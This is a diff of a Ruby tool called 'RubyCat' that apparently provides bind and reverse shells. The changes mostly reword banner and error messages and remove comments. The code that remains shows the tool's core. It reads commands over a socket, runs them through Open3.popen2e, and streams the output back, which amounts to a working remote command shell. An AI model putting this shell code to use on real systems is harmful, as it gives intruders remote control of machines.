@@ -114,23 +114,21 @@ class RubyCat
             socket.print "\n(RubyCat)> "
             command = socket.gets.chomp
             if command.downcase == 'exit' or command.downcase == 'quit'
-              socket.puts "\ngot root?\n\n"
-              break # Close Temporarily Since they asked nicely
+              socket.puts "\nGot root?\n\n"
+              break
             end
             if command.downcase == 'kill' or command.downcase == 'close'
-              socket.puts "\ngot r00t?\n\n"
-              exit # Exit Completely when asked nicely :p
+              socket.puts "\nGot root?\n\n"
+              exit
             end
-            # Use open3 to execute commands as we read and write through socket connection
             Open3.popen2e("#{command}") do | stdin, stdothers |
               IO.copy_stream(stdothers, socket)
             end
           end
           rescue
-            socket.write "Command or file not found!\n"
-            socket.write "Type EXIT or QUIT to close the session.\n"
-            socket.write "Type KILL or CLOSE to kill the shell completely.\n"
-            socket.write "\n\n"
+            socket.write "\nCommand or file is not found!\n"
+            socket.write "Type 'exit' or 'quit' to close the session."
+            socket.write "Type 'kill' or 'close' to kill the shell completely.\n"
             retry
           ensure
             @cleared=0
@@ -156,7 +154,6 @@ class RubyCat
       end
     end
     begin
-      socket.puts "This Reverse connection brought to you by a little Ruby Magic xD\n\n"
       socket.puts "Server Info:"
       count=0
       while count.to_i < 3
@@ -179,8 +176,7 @@ class RubyCat
         socket.print "\n(RubyCat)> "
         command = socket.gets.chomp
         if command.downcase == 'exit' or command.downcase == 'quit'
-          socket.puts "\nOK, closing connection....\n"
-          socket.puts "\ngot r00t?\n\n"
+          socket.puts "\nGot root?\n\n"
           break
         end
         Open3.popen2e("#{command}") do | stdin, stdothers |
